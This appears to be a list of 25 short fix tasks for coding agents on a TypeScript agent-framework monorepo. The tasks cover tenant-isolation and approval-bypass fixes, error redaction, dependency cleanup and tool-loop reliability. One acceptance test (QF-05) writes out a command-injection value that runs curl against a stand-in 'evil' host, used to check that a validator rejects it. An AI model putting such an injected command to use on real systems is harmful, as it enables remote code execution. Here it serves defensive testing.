# Quick Fixes (P1 / <2h each) — DzupAgent run-001

Self-contained prompts. Execute in order; no inter-task dependencies unless noted.
Validation command for all: `yarn typecheck` and the per-package `yarn test --filter <pkg>`.

---

## QF-01 (SEC-01) Approval bypass — wire ownership check
**Domain:** security · **Severity:** Critical · **Agent:** dzupagent-server-dev
**File:** `packages/server/src/routes/approvals.ts:36-78`
**Why:** Endpoint allows any authenticated key to grant/reject any pending approval. Bypasses HITL.
**Change:** Inside both `grant` and `reject` handlers, look up `runStore.get(runId)` and 403 if `run.tenantId !== c.get('apiKey').tenantId`. Mirror the helper used in `routes/approval.ts`.
**Acceptance:** New test in `__tests__/approvals.routes.test.ts` — Tenant A's key gets 403 when grant-targeting Tenant B's runId. Existing happy-path tests still green.
**Validate:** `yarn workspace @dzupagent/server test -- approvals`

---

## QF-02 (SEC-02) Cross-tenant learning — replace `getTenantId`
**Domain:** security · **Severity:** Critical · **Agent:** dzupagent-server-dev
**File:** `packages/server/src/routes/learning.ts:120-126,217-220,274-275,355-365`
**Why:** `c.get('tenantId')` never set in production; everyone falls into `defaultTenantId`. All learning data shared.
**Change:** Replace `getTenantId(c)` body to use `defaultResolveAuthScope(c).tenantId` (mirror `routes/memory-tenant-scope.ts`). Delete the local fallback constant if only this function used it.
**Acceptance:** Two-tenant integration test against `GET /dashboard` asserts disjoint result sets. `rg "c\\.get\\('tenantId'\\)" packages/server/src` returns 0 hits.
**Validate:** `yarn workspace @dzupagent/server test -- learning`

---

## QF-03 (SEC-09) Drop raw `err.message` from server global error handler
**Agent:** dzupagent-server-dev · **Severity:** Medium → quick
**File:** `packages/server/src/composition/middleware.ts:386-396`
**Change:** Use the structured logger; keep client response as `{ error: 'Internal error', code }`. Run existing `redact*` helpers on the server-side log line. Do NOT include `err.message`.
**Acceptance:** Test — handler that throws `new Error('pg: password authentication failed for user "X" with hash …')` produces a response WITHOUT the raw error and a redacted server log line.

---

## QF-04 (SEC-13) Replace metric label `c.req.path` with `c.req.routePath`
**Agent:** dzupagent-server-dev · **File:** `packages/server/src/composition/middleware.ts:369-383`
**Change:** Switch label source. Test that `/api/runs/123` and `/api/runs/456` produce a single label series.
**Validate:** `yarn workspace @dzupagent/server test`

---

## QF-05 (SEC-17) Validate MCP exec path on PATCH
**Agent:** dzupagent-server-dev · **File:** `packages/server/src/routes/mcp.ts:196-222`
**Change:** When PATCH includes `url`, call `validateMcpExecutablePath(patch.url)` before persistence; 400 on rejection.
**Acceptance:** Test — `PATCH /api/mcp/:id { url: '/bin/sh -c \"$(curl evil)\"' }` returns 400 with no DB write.

---

## QF-06 (SEC-19) Type Hono Variables — eliminate `c.set('apiKey' as never, …)`
**Agent:** dzupagent-server-dev · **File:** `packages/server/src/middleware/auth.ts:70` + `packages/server/src/types.ts`
**Change:** Add `apiKey: ApiKeyContext` to `AppVariables` interface. Strip the `as never` cast.
**Acceptance:** `rg "as never" packages/server/src/middleware/auth.ts` returns 0; tsc clean.
**Note:** This dovetails with QF-07 (CODE-01) but is a 30-min sub-step.

---

## QF-07 (SEC-20) Replace `execSync` with `execFile` in hierarchical-walker
**Agent:** dzupagent-core-dev · **File:** `packages/core/src/skills/hierarchical-walker.ts:93-101`
**Change:** Convert `execSync('git rev-parse …')` to `execFile('git', ['rev-parse', …])` (await). Hoist out of any sync constructor — make caller async if needed.
**Acceptance:** No event-loop block; existing tests still green.

---

## QF-08 (ARCH-01) Add `@dzupagent/memory` to `server` deps
**Agent:** dzupagent-architect · **File:** `packages/server/package.json`
**Change:** Add `"@dzupagent/memory": "workspace:^"` to `dependencies`.
**Acceptance:** `cd packages/server && yarn typecheck` (in isolation if possible) passes.

---

## QF-09 (ARCH-02) Bump `adapter-rules` to `0.2.0`
**Agent:** dzupagent-architect · **Files:** `packages/adapter-rules/package.json` + `packages/agent-adapters/package.json`
**Change:** `"version": "0.2.0"` in `adapter-rules`; bump dep in `agent-adapters` accordingly.
**Acceptance:** `yarn install --immutable` clean; tsc clean.

---

## QF-10 (ARCH-09) Reconcile `OrchestratorFacade` LOC vs memory note
**Agent:** dzupagent-architect · **File:** `packages/agent-adapters/src/facade/orchestrator-facade.ts`
**Action:** Decide intent — either continue the split (target was 279 LOC; current 468 LOC) OR update the project-memory note. If splitting: extract delegation hand-off helpers.
**Acceptance:** Either file is ≤300 LOC OR memory note is corrected.

---

## QF-11 (ARCH-11) Mark `agent-adapters` optional-peer in `create-dzupagent`
**Agent:** dzupagent-architect · **File:** `packages/create-dzupagent/package.json`
**Change:** Add `peerDependenciesMeta: { "@dzupagent/agent-adapters": { "optional": true } }`.
**Acceptance:** Static graph tools no longer flag the dynamic import as missing.

---

## QF-12 (ARCH-12/13/17) Fix peer-vs-dep for `app-tools` + `code-edit-kit`
**Agent:** dzupagent-architect · **Files:** `packages/{app-tools,code-edit-kit}/package.json`
**Change:** Move `@dzupagent/core` (and any other directly-imported package) from `peerDependencies` to `dependencies`. Keep contract-only deps as peer.
**Acceptance:** Strict peer resolvers (yarn pnp / pnpm strict) install cleanly.

---

## QF-13 (ARCH-16) Delete dead `packages/playground/` shell
**Agent:** dzupagent-architect · **Files:** `packages/playground/`
**Change:** Move `packages/playground/docs/` to `dzupagent/docs/playground/` if not already there; delete `packages/playground/`. Update workspace globs if they explicitly include it.
**Acceptance:** `find packages/playground -type f` returns nothing; `yarn install` clean.

---

## QF-14 (CODE-15 + CODE-29 + CODE-30) Console-noise cleanup
**Agent:** dzupagent-server-dev / dzupagent-connectors-dev
**Files:**
- `packages/server/src/lifecycle/human-contact-timeout.ts` — replace `console.error` with the structured logger.
- `packages/agent-adapters/src/{base/stream-runner.ts,middleware/memory-enrichment.ts,dzupagent/syncer.ts}` — same.
- `packages/connectors-browser/src/browser/auth-handler.ts:128,132` — replace `as never` with `as Record<string, unknown>` for the DOM probe.
**Acceptance:** `rg "console\\.(log|warn|error)" packages/{server,agent-adapters}/src` shows only intentional CLI lines. `rg "as never" packages/connectors-browser/src` returns 0.

---

## QF-15 (CODE-24) Fixture investigation
**Agent:** dzupagent-test-dev · **File:** `packages/security/src/prompt-injection/fixtures/`
**Action:** `git log --all --diff-filter=D -- packages/security/src/prompt-injection/fixtures/` to see whether `allow.fixtures.ts` and `warn-block.fixtures.ts` were lost. If lost, restore from history. If never existed, remove all references and update CODE-05 fix plan.
**Acceptance:** Either fixtures present + tests reference them OR no test references the directory.

---

## QF-16 (AGENT-108) Replace setTimeout+addEventListener retry-sleep
**Agent:** dzupagent-agent-dev · **File:** `packages/agent/src/agent/tool-loop/policy-enabled-tool-executor.ts:288-298`
**Change:** Replace the manual abort-listener pattern with `AbortablePromise.delay(ms, { signal })` (or implement one in `core/src/utils/`). Guarantees listener removal on natural resolution.
**Acceptance:** Test — invoking 1000 retries does NOT accumulate listeners on the AbortSignal.

---

## QF-17 (AGENT-109) Aggregate tool-batch errors
**Agent:** dzupagent-agent-dev · **File:** `packages/agent/src/agent/tool-loop/tool-scheduler-kernel.ts:156-159`
**Change:** Instead of throwing the first error, collect all errors and throw `new AggregateError(errors, 'Tool batch failed')`. Outputs from successful tools already preserved — keep that behaviour.
**Acceptance:** Test — failing 2 of 3 tools surfaces both errors via AggregateError.

---

## QF-18 (AGENT-112) Emit `context:compression_failed`
**Agent:** dzupagent-agent-dev · **File:** `packages/agent/src/agent/tool-loop.ts:~608`
**Change:** When auto-compress throws, emit `eventBus.publish({ type: 'context:compression_failed', error })`. Track consecutive failures in loop state; throw on second consecutive failure.
**Acceptance:** Test — two consecutive compress throws abort the run with a typed error.

---

## QF-19 (AGENT-117) Verify checkpoint store on startup
**Agent:** dzupagent-agent-dev · **File:** `packages/agent/src/pipeline/pipeline-runtime.ts:99-110`
**Change:** On `PipelineRuntime` construction (when checkpoint store is configured), perform a round-trip ping (`store.healthCheck()` or a no-op write+read). Fail-fast on misconfig.
**Acceptance:** Test — bad store URL aborts runtime construction with a clear error.

---

## QF-20 (AGENT-119) Extract shared `parseSSE`
**Agent:** dzupagent-connectors-dev · **Files:** `packages/agent-adapters/src/{openai,openrouter}/*.ts` + new `packages/agent-adapters/src/utils/sse.ts`
**Change:** Move the duplicated SSE parser into `utils/sse.ts`; have both adapters import.
**Acceptance:** `wc -l` reduction in both adapters; new util has unit test.

---

## QF-21 (AGENT-126) Document task-router weights + add `dryRun`
**Agent:** dzupagent-connectors-dev · **File:** `packages/agent-adapters/src/registry/task-router.ts`
**Change:** Document the scoring formula in JSDoc on the public class; add `dryRun(task: Task): RankedAdapter[]` method exposing the ranking with score breakdown.
**Acceptance:** New test calls `dryRun` and asserts deterministic ordering.

---

## QF-22 (AGENT-129) Schedule `MemoryHealer`
**Agent:** dzupagent-core-dev · **File:** `packages/memory/src/memory-healer.ts` + factory
**Change:** Wire to a periodic scheduler (e.g. `setInterval` with cancel hook). Expose `start()` / `stop()` on the factory.
**Acceptance:** Integration test — long-lived agent sees mid-run pruning, not just post-run.

---

## QF-23 (AGENT-131) Pin judge prompt+model snapshot
**Agent:** dzupagent-test-dev · **File:** `packages/evals/src/scorers/llm-judge-enhanced.ts`
**Change:** Read pinned model+prompt version from `prompt-version-store.ts`; emit warning when caller passes a different version.
**Acceptance:** Test — instantiating with mismatched version logs warning + records metric.

---

## QF-24 (AGENT-132) Per-suite cost cap on evals
**Agent:** dzupagent-test-dev · **File:** `packages/evals/src/orchestrator/eval-orchestrator.ts`
**Change:** Read `cost-tracking.ts` mid-suite; abort with typed error if accumulated cost > config cap.
**Acceptance:** Test — fixture suite exceeding mock cap aborts with `EvalCostExceededError`.

---

## QF-25 (CONSUMER-01) Ship `.d.ts` for `@dzupagent/flow-compiler`
**Agent:** dzupagent-architect · **Files:** `packages/flow-compiler/tsup.config.ts` + `package.json`
**Change:** Ensure `tsup` config has `dts: true` (or use `tsc --emitDeclarationOnly` step); confirm `package.json.types` points at `dist/index.d.ts`.
**Acceptance:** `yarn build --filter=@dzupagent/flow-compiler` produces `dist/index.d.ts`. Consumer (codev-app) typecheck error TS7016 disappears.

---

(End of quick-fixes — 25 items, ~30 hours total.)
